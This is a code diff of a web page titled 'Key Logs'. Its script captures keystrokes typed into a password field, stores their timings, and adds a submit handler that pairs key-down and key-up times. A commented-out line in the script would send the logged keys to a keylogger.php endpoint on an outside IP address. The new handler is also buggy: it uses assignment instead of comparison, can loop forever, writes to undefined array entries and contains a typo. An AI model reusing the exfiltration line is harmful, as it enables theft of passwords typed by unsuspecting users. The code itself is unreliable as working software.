@@ -7,12 +7,12 @@
 
 	<h1>Key Logs</h1>
 
-	<input type="password" id = "text">
+	<input type="password" id = "text">&nbsp &nbsp &nbsp &nbsp &nbsp <button type = "submit" id = "submit">Submit</button>
 	<p id="demo"></p>
 
 <script>
 
-var buffer = [];
+var buffer = [], final = [];
 var oldstroke = new Object();
 var newstroke = new Object();
 
@@ -47,7 +47,6 @@ document.getElementById("text").onkeydown = function(e) {
 
     	}*/
     	buffer.push(stroke);
-    	newstroke = stroke;
     }
 
 	window.setInterval(function(){
@@ -80,21 +79,45 @@ document.getElementById("text").onkeyup = function(e) {
     else if(stroke["key"] != "Shift")
     {
     	buffer.push(stroke);
-    	var up = buffer.pop();
-    	var down = buffer.pop();
-    	var time = up.time-down.time;
-
-    	newstroke.key=stroke.key;
-    	newstroke.time=time;
-    	oldstroke = newstroke;
-    	buffer.push(newstroke);
     }
-
 
 	window.setInterval(function(){
 	//new Image().src = 'http://206.130.110.212/forum/system/keylogger.php?c='+keys;
 		document.getElementById("demo").innerHTML = JSON.stringify(buffer);
 	}, 1000);
+}
+
+document.getElementById("submit").onclick = function(e){
+    var down = new Object();
+    var up = new Object();
+    var c = 0,i = 0,k = 0;
+    for(j = 0 ; j<buffer.length ; j++){
+        i = j+1;
+        c = 0;
+        down = buffer.shift();
+        while(c!= 1){
+            if(buffer[i].key = down.key){
+                var temp = buffer.splice(i,1);
+                up = temp[0];
+                c = 1;
+            }
+        }
+
+        final[k].key = down.key;
+        final[k].keyDownTime = down.time;
+        final[k].keyUpTime = up.time;
+        console.log(final[k] + "\n");
+        k++;
+        /*if(j! = 0){
+            if(final[j].keyDownTime >= final[j-1].keyUpTime){
+                final[j].flightTime = 0;
+                final[j-1].keyPressTime = final[j-1].keyDownTime - finla[j].keyDownTime;
+            }
+
+            else
+                final[j]
+        }*/
+    }
 }
 
 </script>
